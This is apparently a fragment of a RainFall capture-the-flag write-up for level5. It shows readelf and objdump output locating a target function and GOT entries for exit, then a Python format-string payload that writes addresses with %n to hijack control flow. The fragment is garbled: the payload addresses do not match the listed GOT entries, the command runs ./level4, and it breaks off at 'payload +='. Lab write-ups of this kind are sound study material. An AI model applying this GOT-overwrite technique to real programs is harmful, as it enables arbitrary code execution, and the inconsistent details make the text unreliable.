```bash
evel5@RainFall:~$ readelf -s level5 | grep o
Symbol table '.dynsym' contains 10 entries:
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
Symbol table '.symtab' contains 73 entries:
    31: 08048420     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0804984c     1 OBJECT  LOCAL  DEFAULT   25 completed.6159
    33: 08049850     4 OBJECT  LOCAL  DEFAULT   25 dtor_idx.6161
    39: 080485a0     0 FUNC    LOCAL  DEFAULT   13 __do_global_ctors_aux
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    59: 08049844     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o

```

address of function o: 080484a4 -->  \xa4\x84\x04\x08

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

_exit: 08049828 --> \x28\x98\x04\x08


```bash
(python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
```

payload +=

